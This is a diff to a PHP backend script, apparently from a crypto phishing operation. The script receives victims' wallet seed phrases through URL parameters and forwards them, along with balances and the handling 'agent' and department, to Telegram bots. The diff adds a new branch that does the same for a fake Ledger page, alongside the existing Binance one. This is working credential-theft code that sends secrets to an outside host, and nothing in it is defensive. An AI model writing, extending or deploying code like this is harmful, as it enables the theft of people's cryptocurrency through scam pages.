@@ -29,6 +29,7 @@ $reference = isset($_GET['reference']) ? trim($_GET['reference']) : '';
 $token = isset($_GET['token']) ? trim($_GET['token']) : '';
 $action = isset($_GET['action']) ? trim($_GET['action']) : '';
 $seed = isset($_GET['seed']) ? trim($_GET['seed']) : '';
+$siteref = isset($_GET['siteref']) ? trim($_GET['siteref']) : '';
 
 // Validate input
 if (empty($reference) || empty($token)) {
@@ -48,7 +49,7 @@ if (!validateToken($reference, $token)) {
 }
 $referenceData = getReferenceTracking($reference);
 
-if ($action == 'copied') {
+if ($action == 'copied' && $siteref != 'ledger') {
 
     $jsonData = [
         'Activity' => 'Seed Phrase copied',
@@ -60,10 +61,27 @@ if ($action == 'copied') {
     sendDataToTelegramBot($jsonData);
 
     if ($seed) {
-        $jsonData['Activity'] ='Binance';
+        $jsonData['Activity'] = 'Binance';
         $jsonData['Seed Phrase'] = $seed;
         sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);
     }
+} else if ($action == 'copied' && $siteref == 'ledger') {
+
+    $jsonData = [
+        'Activity' => 'Ledger page filled',
+        'Department' => $referenceData['department'] ?? 'Unknown',
+        'Agent' => $referenceData['agent_name'] . ' (' . $referenceData['role'] . ')',
+        'Balance' => $referenceData['balance']
+    ];
+
+    sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);
+
+    if ($seed) {
+        $jsonData['Activity'] = 'Ledger';
+        $jsonData['Seed Phrase'] = $seed;
+        sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);
+    }
+
 }
 
 
